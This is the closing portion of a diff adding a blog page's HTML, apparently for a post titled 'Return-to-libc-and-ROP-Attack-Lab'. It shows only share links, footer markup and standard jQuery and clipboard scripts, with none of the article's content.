+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ceyewan.github.io/p/826ab436.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ceyewan.github.io/p/826ab436.html&text=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ceyewan.github.io/p/826ab436.html&title=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ceyewan.github.io/p/826ab436.html&is_video=false&description=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Return-to-libc-and-ROP-Attack-Lab&body=Check out this article: https://ceyewan.github.io/p/826ab436.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ceyewan.github.io/p/826ab436.html&title=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ceyewan.github.io/p/826ab436.html&title=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ceyewan.github.io/p/826ab436.html&title=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ceyewan.github.io/p/826ab436.html&title=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ceyewan.github.io/p/826ab436.html&name=Return-to-libc-and-ROP-Attack-Lab&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ceyewan.github.io/p/826ab436.html&t=Return-to-libc-and-ROP-Attack-Lab"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+  </div>
+  <div class="footer-left">
+    ceyewan
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
